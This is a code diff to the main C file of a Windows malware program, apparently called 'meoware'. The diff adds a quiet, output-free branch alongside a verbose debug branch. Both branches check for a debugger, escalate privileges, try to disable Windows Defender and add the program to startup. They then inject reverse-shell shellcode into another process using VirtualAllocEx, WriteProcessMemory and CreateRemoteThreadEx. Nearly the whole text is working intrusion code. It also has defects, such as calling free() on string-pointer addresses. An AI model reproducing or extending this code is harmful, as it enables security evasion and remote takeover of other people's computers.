@@ -5,6 +5,7 @@
 #include "disable_windef.h"
 #include "find_pid.h"
 #include "shellcode.h"
+#include <stdbool.h>
 //#include "dll_inj.h"
 
 const char* k = "[+]";
@@ -20,93 +21,156 @@ LPVOID rBuffer = NULL;
 HANDLE hProcess, hThread = NULL;
 
 
-
 int main(int arcg,char* argv[]) {
 
-	if (IsDebuggerPresent()) {
+	if (oDebug)
+	{
 
-	printf("%s the program is debugged ",e);
-	return EXIT_FAILURE;
-	}
+		if (IsDebuggerPresent()) {
 
-	LARGE_INTEGER StartingTime, EndingTime, ElapsedMicroseconds;
-	LARGE_INTEGER Frequency;
+			printf("%s the program is debugged ", e);
+			return EXIT_FAILURE;
+		}
 
-	QueryPerformanceFrequency(&Frequency);
-	QueryPerformanceCounter(&StartingTime);
-	
-	/*
-	AddToStartup();
-	
-	if (arcg < 2) { printf("%s usage : rogram.exe <PID>", e); 
-	return EXIT_FAILURE;
-	}
+		LARGE_INTEGER StartingTime, EndingTime, ElapsedMicroseconds;
+		LARGE_INTEGER Frequency;
 
-	PID = atoi(argv[1]);
-	*/
-	PID = get_pid();
+		QueryPerformanceFrequency(&Frequency);
+		QueryPerformanceCounter(&StartingTime);
 
-	priv_esc();
-	printf("%s trying to disable windows defender...\n",k);
+		/*
+		AddToStartup();
 
-	if (!dis_windef()) { 	
-	
-	printf("%s faild disable windows defender :(\n",e); 
-	}
-
-	printf("%s starting main meoware.exe...\n",i);
-
-
-
-
-	AddToStartup();
-
-	printf("%s trying to open handle to process (%ld)\n", i, PID);
-
-	hProcess = OpenProcess(PROCESS_ALL_ACCESS,FALSE,PID);
-	printf("%s got a handle to the process\n\\---0x%p\n",k,hProcess);
-	
-	if (hProcess == NULL) {
-	
-	printf("%s couldnt get a handle to process (%ld), error : %ld", e, PID, GetLastError());
-	return EXIT_FAILURE;
-	}
-
-	rBuffer = VirtualAllocEx(hProcess,NULL,sizeof(ucReverseShell),(MEM_COMMIT | MEM_RESERVE),PAGE_EXECUTE_READWRITE);
-	printf("%s allocated %zu-bytes with PAGE_EXECUTE_READWRITE permissions\n",k,sizeof(ucReverseShell));
-
-	
-	WriteProcessMemory(hProcess,rBuffer,ucReverseShell,sizeof(ucReverseShell),NULL);
-	printf("%s wrote %zu-bytes to process memory\n", k, sizeof(ucReverseShell));
-
-	hThread = CreateRemoteThreadEx(hProcess,NULL,0,(LPTHREAD_START_ROUTINE)rBuffer,NULL,0,0,&TID);
-
-	if (hThread == NULL) {
-	
-		printf("%s faild to get a handle to the thread , error: %ld ", e,GetLastError());
-		CloseHandle(hProcess);
+		if (arcg < 2) { printf("%s usage : rogram.exe <PID>", e);
 		return EXIT_FAILURE;
+		}
+
+		PID = atoi(argv[1]);
+		*/
+		PID = get_pid();
+
+		priv_esc();
+		printf("%s trying to disable windows defender...\n", k);
+
+		if (!dis_windef()) {
+
+			printf("%s faild disable windows defender :(\n", e);
+		}
+
+		printf("%s starting main meoware.exe...\n", i);
+
+
+
+
+		AddToStartup();
+
+		printf("%s trying to open handle to process (%ld)\n", i, PID);
+
+		hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, PID);
+		printf("%s got a handle to the process\n\\---0x%p\n", k, hProcess);
+
+		if (hProcess == NULL) {
+
+			printf("%s couldnt get a handle to process (%ld), error : %ld", e, PID, GetLastError());
+			return EXIT_FAILURE;
+		}
+
+		rBuffer = VirtualAllocEx(hProcess, NULL, sizeof(ucReverseShell), (MEM_COMMIT | MEM_RESERVE), PAGE_EXECUTE_READWRITE);
+		printf("%s allocated %zu-bytes with PAGE_EXECUTE_READWRITE permissions\n", k, sizeof(ucReverseShell));
+
+		WriteProcessMemory(hProcess, rBuffer, ucReverseShell, sizeof(ucReverseShell), NULL);
+		printf("%s wrote %zu-bytes to process memory\n", k, sizeof(ucReverseShell));
+
+		hThread = CreateRemoteThreadEx(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)rBuffer, NULL, 0, 0, &TID);
+
+		if (hThread == NULL) {
+
+			printf("%s faild to get a handle to the thread , error: %ld ", e, GetLastError());
+			CloseHandle(hProcess);
+			return EXIT_FAILURE;
+		}
+
+		QueryPerformanceCounter(&EndingTime);
+		ElapsedMicroseconds.QuadPart = EndingTime.QuadPart - StartingTime.QuadPart;
+		ElapsedMicroseconds.QuadPart *= 1000000;
+		ElapsedMicroseconds.QuadPart /= Frequency.QuadPart;
+		printf("%s got a handle to the thread (%ld),\n[*]to here in %lu micro Sec\n\\ ---0x%p\n ", k, TID, hThread, ElapsedMicroseconds);
+
+		WaitForSingleObject(hThread, INFINITE);
+		printf("%s thread finished execution\n", k);
+
+		printf("%s cleaning up\n", i);
+		CloseHandle(hThread);
+		CloseHandle(hProcess);
+		free(&k);
+		free(&i);
+		free(&e);
+		printf("%s finishd!\n", k);
+
+		return EXIT_SUCCESS;
 	}
+	else if (!oDebug)
+	{
+
+		if (IsDebuggerPresent()) {
+			return EXIT_FAILURE;
+		}
+
+
+		/*
+		AddToStartup();
+
+		if (arcg < 2) { printf("%s usage : rogram.exe <PID>", e);
+		return EXIT_FAILURE;
+		}
+
+		PID = atoi(argv[1]);
+		*/
+		PID = get_pid();
+
+		priv_esc();
+
+
+		dis_windef();
+
+
+		AddToStartup();
 
 
 
-	
-	QueryPerformanceCounter(&EndingTime);
-	ElapsedMicroseconds.QuadPart = EndingTime.QuadPart - StartingTime.QuadPart;
-	ElapsedMicroseconds.QuadPart *= 1000000;
-	ElapsedMicroseconds.QuadPart /= Frequency.QuadPart;
-	printf("%s got a handle to the thread (%ld),\n[*]to here in %lu micro Sec\n\\ ---0x%p\n ",k,TID,hThread,ElapsedMicroseconds);
-	
-	WaitForSingleObject(hThread, INFINITE);
-	printf("%s thread finished execution\n",k);
+		hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, PID);
 
-	printf("%s cleaning up\n",i);
-	CloseHandle(hThread); 
-	CloseHandle(hProcess);
-	printf("%s finishd!\n", k);
 
-	
+		if (hProcess == NULL) {
 
-	return EXIT_SUCCESS;
+			return EXIT_FAILURE;
+		}
 
+		rBuffer = VirtualAllocEx(hProcess, NULL, sizeof(ucReverseShell), (MEM_COMMIT | MEM_RESERVE), PAGE_EXECUTE_READWRITE);
+
+
+		WriteProcessMemory(hProcess, rBuffer, ucReverseShell, sizeof(ucReverseShell), NULL);
+		
+
+		hThread = CreateRemoteThreadEx(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)rBuffer, NULL, 0, 0, &TID);
+
+		if (hThread == NULL) {
+
+			
+			CloseHandle(hProcess);
+			return EXIT_FAILURE;
+		}
+
+
+		WaitForSingleObject(hThread, INFINITE);
+
+
+		CloseHandle(hThread);
+		CloseHandle(hProcess);
+		free(&k);
+		free(&i);
+		free(&e);
+
+		return EXIT_SUCCESS;
+	}
 }
